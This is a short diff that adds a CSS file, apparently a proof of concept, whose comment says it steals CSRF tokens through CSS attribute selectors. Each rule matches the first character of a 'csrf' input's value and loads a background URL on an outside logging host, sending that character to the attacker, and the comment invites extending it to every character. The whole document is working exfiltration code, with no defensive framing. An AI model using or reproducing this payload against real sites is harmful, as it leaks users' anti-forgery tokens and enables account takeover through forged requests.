@@ -1,0 +1,8 @@
+/* Steals CSRF tokens via CSS attribute selectors */
+input[name="csrf"][value^="a"] { 
+  background: url('https://yourusername.github.io/xss-poc/log?token=a'); 
+}
+input[name="csrf"][value^="b"] { 
+  background: url('https://yourusername.github.io/xss-poc/log?token=b'); 
+}
+/* ...extend for all chars if needed */
